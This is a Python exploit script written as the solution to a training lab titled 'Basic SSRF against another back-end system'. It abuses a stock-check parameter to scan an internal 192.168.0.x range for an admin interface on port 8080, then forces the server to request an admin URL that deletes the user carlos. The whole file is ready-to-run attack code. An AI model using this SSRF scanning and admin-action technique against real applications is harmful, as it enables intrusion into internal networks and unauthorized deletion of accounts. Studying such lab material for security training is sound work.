import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def delete_user(s, url):
    # SCAN THE SUBNET 192.168.0.0/24 TO FIND THE LOCAL IP ADDRESS BOUND TO THE ADMIN INTERFACE
    stock_url = url + '/product/stock'
    for i in range(2, 255, 1):
        params = {
            'stockApi' : 'http://192.168.0.%i:8080/admin' % i
        }
        r = s.post(stock_url, data=params, verify=False, proxies=proxies)
        sys.stdout.write("[+] Testing {0}\r".format(params['stockApi']))
        sys.stdout.flush()
        sys.stdout.write('\033[K')
        if r.status_code == 200:
            print("\n[+] Admin interface found at 192.168.0.%i" % i)
            print("[+] Proceed now to delete the user carlos")
            params = {
                'stockApi' : 'http://192.168.0.%i:8080/admin/delete?username=carlos' % i
            }
            r = s.post(stock_url, data=params, allow_redirects=False, verify=False, proxies=proxies)
            if r.status_code != 302:
                print("[-] Could not delete the user carlos")
                sys.exit(-1)
            print("[+] Exploit worked!")
            sys.exit(-1)
    print("[-] Could not find the admin interface")
    sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()

    print("[+] Lab: Basic SSRF against another back-end system")
    print("""[+] This lab has a stock check feature which fetches data from an internal system.
    To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.""")
    delete_user(s, url)



if __name__ == "__main__":
    main()